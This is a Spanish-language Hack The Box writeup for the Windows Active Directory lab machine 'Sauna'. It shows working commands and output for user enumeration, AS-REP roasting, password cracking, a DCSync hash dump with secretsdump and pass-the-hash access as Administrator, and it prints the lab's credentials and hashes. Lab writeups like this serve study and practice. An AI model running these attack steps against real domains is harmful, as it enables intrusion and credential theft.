---
layout: single
title: Writeup HTB - Maquina Sauna
comments: true
excerpt: "La maquina Sauna es una maquina windows - Easy, empezamos enumerando una pagina web y econtramos usuarios en dicha pagina, generamos posibles usuarios del dominio con la herramienta usersgenerators y comprobamos que usuarios existen en el dominio con la herramienta kerbrute y encontramos el usuario fsmith, usamos la herramienta GetNPUsers.py para realizar un ataque de AS-REP Roasting, obteniendo el TGT de fsmith, crackeamos con john el hash de fsmith y accedemos con evil-winrm con estas credenciales y escalamos al usuario svc_loanmanager ya que encontramos credenciales en autologon. Asi pues accedemos con esas credenciales con evil-winrm para despues usar bloodhound y comprobamos que podemos usar un ataque de DCSync Attack con la herramienta secretsdump obteniendo los hash de todos los usuarios para por ultimo realizando *Overpass The Hash nos* conectarnos como administrator con psexec."
date: 2022-02-04
classes: wide
header:
  teaser: /assets/images/2022-02-04-writeup-maquina-htb-sauna/Untitled.png
  teaser_home_page: true
categories:
  - HackTheBox
tags:
  - OSCP  
  - Hacking
  - Active Directory
  - Easy
---


# HTB - Sauna
<p align="center">
<img src="/assets/images/2022-01-22-writeup-maquina-htb-active/Untitled.png">
</p>

## Resolute
<div style="text-align: justify">
La maquina Sauna es una maquina windows - Easy, empezamos enumerando una pagina web y econtramos usuarios en dicha pagina, generamos posibles usuarios del dominio con la herramienta usersgenerators y comprobamos que usuarios existen en el dominio con la herramienta kerbrute y encontramos el usuario fsmith, usamos la herramienta GetNPUsers.py para realizar un ataque de AS-REP Roasting, obteniendo el TGT de fsmith, crackeamos con john el hash de fsmith y accedemos con evil-winrm con estas credenciales y escalamos al usuario svc_loanmanager ya que encontramos credenciales en autologon. Asi pues accedemos con esas credenciales con evil-winrm para despues usar bloodhound y comprobamos que podemos usar un ataque de DCSync Attack con la herramienta secretsdump obteniendo los hash de todos los usuarios para por ultimo realizando *Overpass The Hash nos* conectarnos como administrator con psexec.
</div>


## Scan Nmap

```bash
# Nmap 7.92 scan initiated Thu Dec 30 19:18:12 2021 as: nmap -sC -sV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49677,49678,49680,49698,49722 -oN targeted -Pn -vvv 10.129.95.180
Nmap scan report for 10.129.95.180
Host is up, received user-set (0.24s latency).
Scanned at 2021-12-30 19:18:12 -05 for 103s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-title: Egotistical Bank :: Home
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2021-12-31 07:18:21Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49677/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49680/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49698/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49722/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: 7h00m00s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 26484/tcp): CLEAN (Timeout)
|   Check 2 (port 38495/tcp): CLEAN (Timeout)
|   Check 3 (port 10224/udp): CLEAN (Timeout)
|   Check 4 (port 29695/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2021-12-31T07:19:15
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Dec 30 19:19:55 2021 -- 1 IP address (1 host up) scanned in 103.34 seconds
```

## Samba - Puerto 445

enumerando smb con crackmapexec podemos vemos el nombre del dominio de la maquina, es util esto para poder ponerlo en nuestro /etc/hosts

```bash
Sauna > crackmapexec smb 10.129.95.180
```

![Untitled](/assets/images/2022-02-04-writeup-maquina-htb-sauna/Untitled%201.png)

## Pagina web - Puerto 80

Revisando la pagina web podemos encontrar usuarios 

![Untitled](/assets/images/2022-02-04-writeup-maquina-htb-sauna/Untitled%202.png)

guardamos dichos usuarios en un archivo de texto

```bash
Sauna ❯ curl -s http://sauna.htb/about.html | grep -i '<p class="mt-2">' | grep -i fergus -A 100 | html2text | tr "[A-Z]" "[a-z"
fergus smith
hugo bear
steven kerb
shaun coins
bowie taylor
sophie driver

Sauna ❯ usersgenerator -u users.txt -o usersAD.txt
```

y usamos la herramienta usersgenerator para generar combinaciones de usuarios para el dominio

![Untitled](/assets/images/2022-02-04-writeup-maquina-htb-sauna/Untitled%203.png)

verificamos la existencia usuarios validos con la herramienta kerbrute de la siguiente manera, encontrando un usuario valido fsmith

```bash
kerbrute userenum --domain egotistical-bank.local usersAD.txt --dc sauna.htb -t 100
```

![Untitled](/assets/images/2022-02-04-writeup-maquina-htb-sauna/Untitled%204.png)

## ASREPRoast

El ASREPRoast es una técnica parecida a Kerberoasting que intenta crackear offline las contraseñas de los usuarios de servicio pero las de los que tienen el atributo DONT_REQ_PREAUTH, es decir, los que no se les requiere pre-autenticación en kerberos. Por lo tanto ya que tenemos  un usuario valido veamos si ese usuario es vulnerable a ASREPRoast.

```bash
Sauna ❯ GetNPUsers.py egotistical-bank.local/fsmith -no-pass                                  
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

[*] Getting TGT for fsmith
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:7031940ad2f3b23f91a461d6c2420643$11abe9d5297bdf2cc9e55ef0d4ca21ce902575f0248d3af7e41a00cef47e69aa6065d6a8bf789d256c2384e773fa7cbf2f362ddeb104b16ab3dcb3253c04e851f159122b15c361ec0639a0a053b05b6211cb83fe6f44015d57a8509626ecd0233ac7a5d0487c354567afbf73fa0d815427236c9c460100f5ea5cda3159f67bd9d86adb5664670cf130b92981fcf4f82e4c0392acbba6fd87d71f9108f25265c2aec4a9ba40c357b2c3578724d7a9c34db6503e43e05411fec58f033c895e142b8fa9213bc3b8dd2e8f8de4a5ad2482fb1671cde2b8e8d661290665e3a34595db7aaa7ee7d0aa9aed5d2cbfa2c196b153e56a2130b3d3a722177a4023387cafbb
```

![Untitled](/assets/images/2022-02-04-writeup-maquina-htb-sauna/Untitled%205.png)

crackeamos el hash de fsmith con john the ripper

```bash

Sauna ❯ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Thestrokes23     ($krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL)
1g 0:00:00:31 DONE (2022-01-04 14:15) 0.03144g/s 331415p/s 331415c/s 331415C/s Thosewerethedays..Thegreatest1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

![Untitled](/assets/images/2022-02-04-writeup-maquina-htb-sauna/Untitled%206.png)

## Acceso WinRM - Usuario fsmith

ya que crackeamos el hash de fsmith, accedemos con esas credenciales con evil-winrm  y aprovechamos y leemos la flag del user.txt

![Untitled](/assets/images/2022-02-04-writeup-maquina-htb-sauna/Untitled%207.png)

## Escalacion de privilegios - User svc_loanmanager

enumerando podemos encontrar credenciales del usuario svc_loanmanager en winlogon  

![Untitled](/assets/images/2022-02-04-writeup-maquina-htb-sauna/Untitled%208.png)

![Untitled](/assets/images/2022-02-04-writeup-maquina-htb-sauna/Untitled%209.png)

## Acceso winrm - User svc_loanmanager

accedemos con win-rm con las  credenciales encontradas del usuario svc_loanmgr

```bash
evil-winrm -i sauna.htb -u svc_loanmgr -p 'Moneymakestheworldgoround!'
```

![Untitled](/assets/images/2022-02-04-writeup-maquina-htb-sauna/Untitled%2010.png)

## Escalacion de privilegios - User root

para escalar privilegios como root, usaremos bloodhound para ellos iniciaremos neo4j

```bash
Sauna # > neo4j console
```

![Untitled](/assets/images/2022-02-04-writeup-maquina-htb-sauna/Untitled%2011.png)

subimos a la maquina victima SharpHound.exe 

![Untitled](/assets/images/2022-02-04-writeup-maquina-htb-sauna/Untitled%2012.png)

y ejecutamos de la siguiente manera

![Untitled](/assets/images/2022-02-04-writeup-maquina-htb-sauna/Untitled%2013.png)

Sharphound nos genero un archivo zip, que descagaremos a nuestra maquina local

![Untitled](/assets/images/2022-02-04-writeup-maquina-htb-sauna/Untitled%2014.png)

subimos dicho archivo a bloodhound y encontramos que svc_loanmanager puede ejecutar  `GetChanges` y `GetChangesAll` en el dominio, pudiendo realizar un ataque de DCSync attack

![Untitled](/assets/images/2022-02-04-writeup-maquina-htb-sauna/Untitled%2015.png)

### DCSync Attack

este ataque me permitira dumpear todos los hash de los usuarios del dominio usando la herramienta secretsdump.py

```bash
> secretsdump.py svc_loanmgr:'Moneymakestheworldgoround!'@10.129.95.180
```

![Untitled](/assets/images/2022-02-04-writeup-maquina-htb-sauna/Untitled%2016.png)

### Overpass The Hash

con dicho hash podremos conectarnos con psexec o evil-winrm, como lo haremos de la siguiente manera

```bash
> evil-winrm -i sauna.htb -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e
```

![Untitled](/assets/images/2022-02-04-writeup-maquina-htb-sauna/Untitled%2017.png)

de esta manera logramos acceder como un usuario de mas altos privilegios, gracias por tomarte tu tiempo en leer este writeup. gracias nos vemos.